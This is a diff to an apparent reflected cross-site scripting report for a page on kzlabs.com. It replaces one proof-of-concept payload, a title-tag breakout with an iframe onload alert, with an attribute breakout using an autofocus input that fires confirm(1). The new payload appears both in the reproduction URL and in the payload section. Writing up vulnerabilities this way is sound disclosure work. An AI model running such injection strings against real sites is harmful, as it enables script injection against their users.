@@ -23,7 +23,7 @@ The application reflects user-supplied input directly into the response without 
 1. Navigate to the following URL:
 
 ```text
-http://kzlabs.com/7.php?q=RJ</title><iframe onload="alert(1)" src="about:blank">
+https://kzlabs.com/7.php?q=%22%3E%3Cinput%20autofocus%20onfocus=confirm(1)%3E
 ```
 
 2. Observe that a JavaScript popup is triggered automatically.
@@ -33,7 +33,7 @@ http://kzlabs.com/7.php?q=RJ</title><iframe onload="alert(1)" src="about:blank">
 ## Payload Used
 
 ```html
-RJ</title><iframe onload="alert(1)" src="about:blank">
+"><input autofocus onfocus=confirm(1)>
 ```
 
 ## Proof of Concept
